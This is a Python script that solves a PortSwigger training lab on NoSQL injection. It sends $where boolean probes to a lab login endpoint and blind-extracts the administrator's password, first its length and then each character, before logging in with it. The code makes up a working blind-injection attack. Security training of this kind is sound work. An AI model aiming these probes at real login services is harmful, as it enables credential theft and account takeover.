"""
Lab 3: Exploiting NoSQL injection to extract data
https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data
Difficulty: Practitioner

📝 Use a $where clause carrying a JS boolean expression to blind-extract
administrator's password character by character — $ne locks us out of a
direct login, so $where's true/false response difference is the oracle.
"""

from utils import get_session, where_clause_probe, log, note, CHARSET

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
LOGIN_PATH = "/login"


def run():
    s = get_session()

    note("Step 1: confirm $where is accepted and its true/false distinction")
    note("is observable via the response (locked vs invalid-credentials).")
    r_true = where_clause_probe(s, f"{TARGET}{LOGIN_PATH}", "administrator", "0 == 0")
    r_false = where_clause_probe(s, f"{TARGET}{LOGIN_PATH}", "administrator", "0 == 1")
    log(f"true probe: {r_true.text[:150]}")
    log(f"false probe: {r_false.text[:150]}")

    note("Step 2: extract the password length first.")
    length = None
    for n in range(1, 40):
        r = where_clause_probe(s, f"{TARGET}{LOGIN_PATH}", "administrator",
                                f"this.password.length == {n}")
        if "lock" in r.text.lower():
            length = n
            log(f"Password length: {n}")
            break
    if not length:
        log("Couldn't determine length — check the true/false signal text.", ok=False)
        return

    note("Step 3: extract the password character by character.")
    found = ""
    for pos in range(length):
        for c in CHARSET + string_extra():
            where_expr = f"this.password[{pos}] == '{c}'"
            r = where_clause_probe(s, f"{TARGET}{LOGIN_PATH}", "administrator", where_expr)
            if "lock" in r.text.lower():
                found += c
                log(f"Progress: {found!r}")
                break
    log(f"Extracted password: {found!r}")

    note("Step 4: log in as administrator with the extracted password.")
    r = s.post(f"{TARGET}{LOGIN_PATH}", json={"username": "administrator", "password": found})
    log(f"Login status: {r.status_code}")


def string_extra():
    import string
    return string.ascii_uppercase + string.punctuation.replace("'", "").replace("\\", "")


if __name__ == "__main__":
    run()
